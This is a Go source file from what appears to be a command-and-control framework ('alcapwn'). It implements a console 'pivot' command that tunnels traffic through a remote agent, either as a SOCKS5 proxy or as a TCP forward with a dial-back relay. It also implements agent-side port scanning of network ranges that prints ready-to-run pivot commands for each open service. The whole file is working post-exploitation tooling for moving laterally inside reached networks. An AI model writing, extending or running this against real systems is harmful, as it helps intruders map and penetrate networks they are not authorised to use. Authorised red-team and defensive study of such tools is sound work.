package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"alcapwn/proto"
)

// pivotState tracks active pivot listeners for a session.
type pivotState struct {
	fwdListeners map[int]net.Listener // localPort → listener (TCP forward + SOCKS5)
}

// Close stops all active pivot listeners.
func (p *pivotState) Close() {
	for port, ln := range p.fwdListeners {
		ln.Close()
		delete(p.fwdListeners, port)
	}
}

// cmdPivot handles the pivot command.
//
// Usage:
//
//	pivot <id> --socks5 <localPort>            local SOCKS5 proxy, routes any CONNECT through agent
//	pivot <id> --fwd <localPort>:<host>:<port> TCP forward: local port → agent → host:port
func (c *Console) cmdPivot(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: pivot <id> [--socks5 <port> | --fwd <localPort>:<host>:<port>]")
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] Session %d not found\n", id)
		return
	}
	if !sess.IsAgent {
		fmt.Printf("[!] Session %d is not an agent session\n", id)
		return
	}

	i := 1
	for i < len(args) {
		switch args[i] {
		case "--socks5":
			if i+1 >= len(args) {
				fmt.Println("[!] --socks5 requires a local port")
				return
			}
			port, err := strconv.Atoi(args[i+1])
			if err != nil || port < 1 || port > 65535 {
				fmt.Printf("[!] Invalid port: %s\n", args[i+1])
				return
			}
			i += 2
			c.doPivotSOCKS5(sess, port)
		case "--fwd":
			if i+1 >= len(args) {
				fmt.Println("[!] --fwd requires localPort:host:port")
				return
			}
			parts := strings.SplitN(args[i+1], ":", 3)
			if len(parts) != 3 {
				fmt.Println("[!] --fwd format: localPort:targetHost:targetPort")
				return
			}
			localPort, err := strconv.Atoi(parts[0])
			if err != nil || localPort < 1 || localPort > 65535 {
				fmt.Printf("[!] Invalid local port: %s\n", parts[0])
				return
			}
			target := parts[1] + ":" + parts[2]
			i += 2
			c.doPivotForward(sess, localPort, target)
		default:
			fmt.Printf("[!] Unknown flag: %s\n", args[i])
			return
		}
	}
}

// c2RelayIP returns the IP address that the agent can reach back to us on.
// Derived from the listener address the session came through; falls back to
// parsing the agent's remote address to find the right interface.
func c2RelayIP(sess *Session) string {
	if sess.ListenerAddr != "" {
		host, _, err := net.SplitHostPort(sess.ListenerAddr)
		if err == nil && host != "" && host != "0.0.0.0" && host != "::" {
			return host
		}
	}
	// Listener bound to 0.0.0.0: find the local IP that routes to the agent.
	agentHost, _, _ := net.SplitHostPort(sess.RemoteAddr)
	if agentHost == "" {
		agentHost = sess.RemoteAddr
	}
	conn, err := net.DialTimeout("udp", agentHost+":1", time.Second)
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

// openRelayListener opens a temporary TCP listener on an ephemeral port and
// returns it along with the full "ip:port" address the agent should dial.
func (c *Console) openRelayListener(sess *Session) (net.Listener, string, error) {
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return nil, "", fmt.Errorf("relay listener: %w", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ip := c2RelayIP(sess)
	return ln, fmt.Sprintf("%s:%d", ip, port), nil
}

// proxyRelay connects clientConn to the agent relay for target.
// Opens a per-connection relay listener, dispatches TaskForward to the agent,
// accepts the agent's relay connection, then proxies bidirectionally.
// Blocks until the connection is closed.
func (c *Console) proxyRelay(sess *Session, clientConn net.Conn, target string) {
	defer clientConn.Close()

	relayLn, relayAddr, err := c.openRelayListener(sess)
	if err != nil {
		fmt.Printf("[!] pivot: %v\n", err)
		return
	}
	defer relayLn.Close()

	// Dispatch TaskForward to agent in background; it blocks until relay ends.
	go func() {
		agentDispatch(sess, proto.Task{
			ID:     agentTaskID("fwd", target),
			Kind:   proto.TaskForward,
			Target: target,
			Relay:  relayAddr,
		}, 10*time.Minute)
	}()

	// Accept the agent's relay-back connection (30 s window for agent to dial).
	relayLn.(*net.TCPListener).SetDeadline(time.Now().Add(30 * time.Second))
	relayConn, err := relayLn.Accept()
	if err != nil {
		fmt.Printf("[!] pivot: agent did not connect back in time: %v\n", err)
		return
	}
	defer relayConn.Close()
	relayLn.Close() // no more connections needed

	// Bidirectional proxy.
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		io.Copy(relayConn, clientConn)
		if tc, ok := relayConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
	}()
	go func() {
		defer wg.Done()
		io.Copy(clientConn, relayConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
	}()
	wg.Wait()
}

// doPivotForward opens a local TCP listener on localPort and forwards every
// incoming connection to target (host:port) via the agent relay.
func (c *Console) doPivotForward(sess *Session, localPort int, target string) {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		fmt.Printf("[!] pivot: bind 127.0.0.1:%d: %v\n", localPort, err)
		return
	}

	fmt.Printf("[+] TCP forward: 127.0.0.1:%d → agent %d → %s\n", localPort, sess.ID, target)

	sess.mu.Lock()
	if sess.pivotState == nil {
		sess.pivotState = &pivotState{fwdListeners: make(map[int]net.Listener)}
	}
	sess.pivotState.fwdListeners[localPort] = ln
	sess.mu.Unlock()

	go func() {
		defer ln.Close()
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go c.proxyRelay(sess, conn, target)
		}
	}()
}

// doPivotSOCKS5 starts a SOCKS5 listener on the C2 server at the given port.
// Every CONNECT request is relayed through the agent to the requested destination.
func (c *Console) doPivotSOCKS5(sess *Session, localPort int) {
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		fmt.Printf("[!] pivot: bind 127.0.0.1:%d: %v\n", localPort, err)
		return
	}

	fmt.Printf("[+] SOCKS5 proxy: 127.0.0.1:%d → agent %d → <any>\n", localPort, sess.ID)
	fmt.Printf("[*] Configure: proxychains4 -q <tool> OR curl --socks5 127.0.0.1:%d ...\n", localPort)

	sess.mu.Lock()
	if sess.pivotState == nil {
		sess.pivotState = &pivotState{fwdListeners: make(map[int]net.Listener)}
	}
	sess.pivotState.fwdListeners[localPort] = ln
	sess.mu.Unlock()

	go func() {
		defer ln.Close()
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go c.handleSOCKS5Client(sess, conn)
		}
	}()
}

// handleSOCKS5Client performs the SOCKS5 handshake, extracts the destination,
// then relays the connection through the agent via proxyRelay.
func (c *Console) handleSOCKS5Client(sess *Session, conn net.Conn) {
	target, err := socks5Handshake(conn)
	if err != nil {
		conn.Close()
		return
	}
	// proxyRelay owns the conn lifecycle from here.
	c.proxyRelay(sess, conn, target)
}

// socks5Handshake performs SOCKS5 method negotiation and CONNECT request parsing.
// Returns the target "host:port" string, having already sent the success reply,
// so the caller can immediately start proxying data.
func socks5Handshake(conn net.Conn) (string, error) {
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{})

	buf := make([]byte, 512)

	// Auth negotiation: VER NMETHODS METHODS...
	n, err := conn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return "", fmt.Errorf("socks5: bad greeting")
	}
	nmethods := int(buf[1])
	if n < 2+nmethods {
		return "", fmt.Errorf("socks5: truncated methods")
	}
	// We only support NO AUTH (0x00).
	hasNoAuth := false
	for i := 0; i < nmethods; i++ {
		if buf[2+i] == 0x00 {
			hasNoAuth = true
			break
		}
	}
	if !hasNoAuth {
		conn.Write([]byte{0x05, 0xFF})
		return "", fmt.Errorf("socks5: no acceptable auth method")
	}
	conn.Write([]byte{0x05, 0x00})

	// CONNECT request: VER CMD RSV ATYP DST.ADDR DST.PORT
	n, err = conn.Read(buf)
	if err != nil || n < 7 || buf[0] != 0x05 {
		return "", fmt.Errorf("socks5: bad request")
	}
	if buf[1] != 0x01 {
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return "", fmt.Errorf("socks5: only CONNECT supported")
	}

	var host string
	var portOff int
	switch buf[3] {
	case 0x01: // IPv4
		if n < 10 {
			return "", fmt.Errorf("socks5: truncated IPv4")
		}
		host = net.IP(buf[4:8]).String()
		portOff = 8
	case 0x03: // domain
		dlen := int(buf[4])
		if n < 5+dlen+2 {
			return "", fmt.Errorf("socks5: truncated domain")
		}
		host = string(buf[5 : 5+dlen])
		portOff = 5 + dlen
	case 0x04: // IPv6
		if n < 22 {
			return "", fmt.Errorf("socks5: truncated IPv6")
		}
		host = net.IP(buf[4:20]).String()
		portOff = 20
	default:
		conn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return "", fmt.Errorf("socks5: unsupported address type")
	}

	port := int(buf[portOff])<<8 | int(buf[portOff+1])
	target := fmt.Sprintf("%s:%d", host, port)

	// Send success reply (BND.ADDR = 0.0.0.0, BND.PORT = 0).
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	return target, nil
}

// cmdScan runs a TCP-connect port scan on the agent side.
//
// Usage:
//
//	scan <id> <cidr>                        default ports
//	scan <id> <cidr> --ports 22,80,443      custom ports
//	scan <id> <cidr> --timeout 250          ms per connection (default 500)
func (c *Console) cmdScan(args []string) {
	if len(args) < 2 {
		fmt.Println("Usage: scan <id> <cidr|ip> [--ports p1,p2,...] [--timeout ms]")
		return
	}

	id, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] Session %d not found\n", id)
		return
	}
	if !sess.IsAgent {
		fmt.Printf("[!] Session %d is not an agent session\n", id)
		return
	}

	cidr := args[1]
	var ports []int
	timeoutMs := 0

	for i := 2; i < len(args); i++ {
		switch args[i] {
		case "--ports":
			if i+1 >= len(args) {
				fmt.Println("[!] --ports requires a comma-separated port list")
				return
			}
			for _, ps := range strings.Split(args[i+1], ",") {
				ps = strings.TrimSpace(ps)
				if ps == "" {
					continue
				}
				p, err := strconv.Atoi(ps)
				if err != nil || p < 1 || p > 65535 {
					fmt.Printf("[!] Invalid port: %s\n", ps)
					return
				}
				ports = append(ports, p)
			}
			i++
		case "--timeout":
			if i+1 >= len(args) {
				fmt.Println("[!] --timeout requires a value in milliseconds")
				return
			}
			timeoutMs, err = strconv.Atoi(args[i+1])
			if err != nil || timeoutMs <= 0 {
				fmt.Printf("[!] Invalid timeout: %s\n", args[i+1])
				return
			}
			i++
		default:
			fmt.Printf("[!] Unknown flag: %s\n", args[i])
			return
		}
	}

	fmt.Printf("[*] Scanning %s via agent %d...\n", cidr, id)

	res, err := agentDispatch(sess, proto.Task{
		ID:        agentTaskID("scan", cidr),
		Kind:      proto.TaskScan,
		Target:    cidr,
		Ports:     ports,
		TimeoutMs: timeoutMs,
	}, 5*time.Minute)
	if err != nil {
		fmt.Printf("[!] Scan error: %v\n", err)
		return
	}
	if res.Error != "" {
		fmt.Printf("[!] Scan error: %s\n", res.Error)
		return
	}

	// Parse and display results.
	var sr struct {
		Hosts []struct {
			IP        string `json:"ip"`
			OpenPorts []int  `json:"open_ports"`
		} `json:"hosts"`
		Scanned  int    `json:"scanned"`
		Duration string `json:"duration"`
	}
	if err := json.Unmarshal(res.Output, &sr); err != nil {
		fmt.Printf("[!] Failed to parse scan results: %v\n", err)
		fmt.Printf("%s\n", res.Output)
		return
	}

	if len(sr.Hosts) == 0 {
		fmt.Printf("[*] No hosts found (%d IPs scanned in %s)\n", sr.Scanned, sr.Duration)
		return
	}

	sessID, _ := strconv.Atoi(args[0])
	fmt.Printf("[+] %d host(s) up — %d IPs scanned in %s\n\n", len(sr.Hosts), sr.Scanned, sr.Duration)
	for _, h := range sr.Hosts {
		portStrs := make([]string, len(h.OpenPorts))
		for i, p := range h.OpenPorts {
			portStrs[i] = strconv.Itoa(p)
		}
		fmt.Printf("  %-18s  open: %s\n", h.IP, strings.Join(portStrs, ", "))
	}

	// Print ready-to-run pivot commands for each discovered service.
	fmt.Printf("\n  [PIVOT COMMANDS]\n")
	for _, h := range sr.Hosts {
		for _, port := range h.OpenPorts {
			localPort := pivotLocalPort(port)
			fmt.Printf("  pivot %d --fwd %d:%s:%d\n", sessID, localPort, h.IP, port)
		}
	}
	fmt.Println()
}

// pivotLocalPort returns a suggested local port for forwarding a given remote port.
// Adds 10000 to avoid conflicts with well-known ports, capped at 65535.
func pivotLocalPort(remotePort int) int {
	lp := remotePort + 10000
	if lp > 65535 {
		lp = remotePort
	}
	return lp
}
